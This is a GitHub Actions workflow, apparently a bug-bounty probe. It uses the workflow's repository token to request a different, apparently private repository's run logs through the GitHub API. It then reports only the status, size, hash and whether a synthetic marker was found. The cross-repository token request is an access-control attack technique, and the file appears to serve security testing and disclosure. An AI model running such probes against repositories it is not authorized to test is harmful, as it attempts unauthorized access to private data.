name: public-log-probe-1794120323
on:
  workflow_dispatch:
permissions:
  contents: read
  actions: read
jobs:
  probe:
    runs-on: ubuntu-latest
    steps:
      - name: request private target logs with repository token
        env:
          GH_TOKEN: ${{ github.token }}
          TARGET_RUN_ID: '42456040088'
          MARKER: 'PRIVATE_ACTIONS_LOG_MARKER_1794120323_SYNTHETIC_ONLY'
        shell: bash
        run: |
          set +e
          url="https://api.github.com/repos/Srj0210/bbtest-priv-1782669390/actions/runs/$TARGET_RUN_ID/logs"
          status=$(curl -sS -L -o /tmp/target-logs.bin -w '%{http_code}' \
            -H 'Accept: application/vnd.github+json' \
            -H 'X-GitHub-Api-Version: 2022-11-28' \
            -H "Authorization: Bearer $GH_TOKEN" "$url")
          bytes=$(wc -c < /tmp/target-logs.bin)
          sha=$(sha256sum /tmp/target-logs.bin | awk '{print $1}')
          marker=$(MARKER="$MARKER" python3 - /tmp/target-logs.bin <<'PY'
          import io, os, sys, zipfile
          path = sys.argv[1]
          needle = os.environ['MARKER'].encode()
          try:
              raw = open(path, 'rb').read()
              with zipfile.ZipFile(io.BytesIO(raw)) as archive:
                  marker = int(any(needle in archive.read(name) for name in archive.namelist() if not name.endswith('/')))
          except Exception:
              marker = 0
          print(marker)
          PY
          )
          case "$marker" in 0|1) ;; *) marker=0 ;; esac
          printf 'PUBLIC_SOURCE_TARGET_LOG_STATUS=%s TARGET_LOG_BYTES=%s TARGET_LOG_SHA256=%s MARKER_MATCH=%s\n' "$status" "$bytes" "$sha" "$marker"
